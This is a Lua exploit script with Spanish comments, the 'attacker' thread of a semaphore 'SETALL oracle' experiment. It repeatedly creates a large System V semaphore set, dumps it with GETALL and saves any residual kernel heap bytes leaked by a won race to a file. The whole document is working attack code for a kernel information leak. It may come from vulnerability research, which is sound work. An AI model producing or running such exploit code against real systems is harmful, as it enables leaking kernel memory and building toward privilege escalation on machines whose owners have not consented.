-- exp22a_oracle_attacker.lua — HILO A del oráculo SETALL (roadmap §1b/Exp 1b)
-- Ciclo: crear set GRANDE (64 sems, marcadores=posición) en clave fija + RMID.
-- Tras cada carrera acertada de la víctima, los sems ≥8 contienen bytes del heap
-- adyacente al buffer pequeño de la víctima. Se vuelcan vía GETVAL.
local E = require("common_1352")
local NSEMS_BIG = 64
local KEY = 0x1354
local cycles = tonumber(arg and arg[1]) or 100000

E.log("ORACLE-A", "ciclos=%d nsems_grande=%d", cycles, NSEMS_BIG)
for c = 1, cycles do
    local sid = syscall.semget(KEY, NSEMS_BIG, E.IPC_CREAT + 0x1B6)
    if sid and sid >= 0 then
        -- leer TODOS los valores: si algún sem ≥8 difiere del marcador,
        -- una carrera acertada escribió bytes residuales ahí
        local argp = malloc(8); write64(argp, malloc(NSEMS_BIG * 2))
        local r = E.try(syscall.__semctl, sid, 0, E.GETALL, read64(argp))
        if r == 0 then
            local data = read_buffer(read64(argp), NSEMS_BIG * 2)
            local anomalo = false
            for i = 8, NSEMS_BIG - 1 do
                local v = string.unpack("<I2", data, i * 2 + 1)
                if v ~= i % E.SEMVMX then anomalo = true end
            end
            if anomalo then
                E.log("ORACLE-A", "ciclo %d: RESIDUO detectado", c)
                file_write("/data/oracle_hits.bin",
                           string.pack("<I4", c) .. data, "ab")
            end
        end
        syscall.__semctl(sid, 0, E.IPC_RMID, 0)
    end
end
E.log("ORACLE-A", "fin")
